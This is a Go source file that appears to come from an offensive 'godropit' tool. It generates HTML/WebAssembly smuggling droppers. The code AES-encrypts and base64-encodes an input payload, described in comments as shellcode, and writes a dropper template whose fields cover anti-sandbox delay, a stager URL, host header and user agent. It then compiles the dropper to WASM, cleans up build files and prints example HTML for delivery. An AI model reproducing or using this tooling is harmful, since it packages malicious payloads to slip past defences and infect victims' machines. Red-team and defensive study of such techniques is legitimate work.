package gengo

import (
	"fmt"
	"log"
	"os"
	"path/filepath"

	"github.com/kopp0ut/godropit/pkg/dropfmt"

	"github.com/fatih/color"
)

type Smuggler struct {

	// Main Components
	FuncName string
	FileName string
	KeyStr   string //EncryptionKey
	BufStr   string //Base64Shellcodestr

	//Template Specific
	Import string
	Extra  string

	//AntiSandbox/Evasion
	Delay int

	//Stager
	Stager       string
	StegImport   string
	StagerImport string
	Url          string
	HostHdr      string
	Ua           string
}

func NewSmuggler(dropname, input, output, url, image, host, useragent string) {

	var goDrop Smuggler

	var fileBuf dropfmt.DropFmt

	fileBuf = GetBytes(input)

	fileBuf.AESEncrypt()
	goDrop.BufStr = `"` + fileBuf.ToB64() + `"`
	goDrop.KeyStr = `"` + fileBuf.KeyB64() + `"`
	if Debug {
		//Write fileBuf files in case they are needed later.
		scFilepath := filepath.Join(output, dropname+"_encryptedB64.txt")
		scFile, err := os.Create(scFilepath)
		if err != nil {
			log.Fatalf("Error creating smuggle file: %v ", err)

		}
		scFile.WriteString("SmuggleKey: " + goDrop.KeyStr + "\n")
		scFile.WriteString("SmuggleBuf:\n" + goDrop.BufStr)
		scFile.Close()
		binFilepath := filepath.Join(output, dropname+"_Clear.bin")
		fmt.Println(binFilepath)
		binFile, err := os.Create(binFilepath)
		if err != nil {
			log.Fatalf("Error creating smuggle file: %v ", err)

		}
		binFile.Write(fileBuf.Buf)
		binFile.Close()

	}

	//write our dropper template.
	dropfilename := dropname + ".go"
	dropFilepath := filepath.Join(output, dropfilename)
	dropperFile, err := os.Create(dropFilepath)
	if err != nil {
		log.Fatalf("Error creating dropper file: %v ", err)
	}

	//Write the final template
	err = goDrop.writeFinalTemplate(dropperFile)
	if err != nil {
		log.Fatalf("Error writing dropper source:\n%v\n", err)
	}
	dropperFile.Close()
	if Debug {
		color.Green("Smuggler src written to: %s\n", dropFilepath)
	}

	//compile the dropper with the regular go compiler.

	buildWasm(output, dropfilename)

	if !Debug {

		err = os.Remove(dropfilename)
		if err != nil {
			log.Print(err)
		}
		err = os.Remove("go.mod")
		if err != nil {
			log.Print(err)
		}
		err = os.Remove("go.sum")
		if err != nil {
			log.Print(err)
		}
		err = os.Remove("goenv.txt")
		if err != nil {
			log.Print(err)
		}
	}

	fmt.Printf("Example HTML:\n")

	_, filename := filepath.Split(input)

	PrintTemplateStr(filename, htmlExample)

	fmt.Printf("\nThe wasm-exec.js can be found in your go bin path.\nThis is usually: $(go env GOROOT)/misc/wasm/wasm_exec.js \n\nConsider using tinygo if your wasm files are large.")

}
